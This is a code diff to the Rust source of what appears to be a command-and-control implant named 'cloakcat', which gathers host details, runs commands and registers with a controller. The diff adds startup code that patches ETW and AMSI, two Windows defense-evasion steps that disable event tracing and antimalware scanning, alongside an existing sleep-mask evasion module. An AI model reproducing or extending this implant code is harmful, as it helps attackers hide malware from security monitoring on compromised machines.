@@ -23,6 +23,7 @@ use rand::Rng;
 use tokio::time::sleep;
 
 use crate::config::{load_agent_config, load_malleable_profile};
+use crate::evasion::patch::PatchManager;
 use crate::evasion::sleep_mask::SleepMask;
 use crate::exec::run_command;
 use crate::host::{collect_hostname, collect_ip_addrs, collect_os_version, collect_username};
@@ -277,6 +278,21 @@ pub async fn run() -> anyhow::Result<()> {
     } else {
         None
     };
+
+    // Apply AMSI + ETW patches unless CLOAKCAT_NO_PATCH=1.
+    let mut _patch_mgr = PatchManager::new();
+    if env::var("CLOAKCAT_NO_PATCH").as_deref() != Ok("1") {
+        if let Err(e) = _patch_mgr.patch_etw() {
+            debug_log!("[agent] ETW patch failed: {e}");
+        } else {
+            debug_log!("[agent] ETW patched");
+        }
+        if let Err(e) = _patch_mgr.patch_amsi() {
+            debug_log!("[agent] AMSI patch failed: {e}");
+        } else {
+            debug_log!("[agent] AMSI patched");
+        }
+    }
 
     let reg = cloakcat_protocol::RegisterReq {
         agent_id: agent_id.clone(),
